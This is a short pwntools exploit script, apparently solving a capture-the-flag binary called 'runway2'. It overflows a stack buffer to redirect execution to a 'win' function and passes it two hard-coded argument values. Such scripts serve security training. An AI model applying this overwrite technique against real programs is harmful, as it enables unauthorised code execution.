#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("runway2")

gs = '''
b win
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("address", 12345)
    else:
        return process(elf.path)

# Plan:

# Addresses
coffee = 0xc0ffee
babe = 0x007ab1e
offset = 28

# Functions

io = start()

payload = b"A"*offset
payload += p32(elf.sym['win'])
payload += b"B"*4 # rbp
payload += p32(coffee)
payload += p32(babe)

io.recvline()
io.recvline()
io.sendline(payload)

io.interactive()
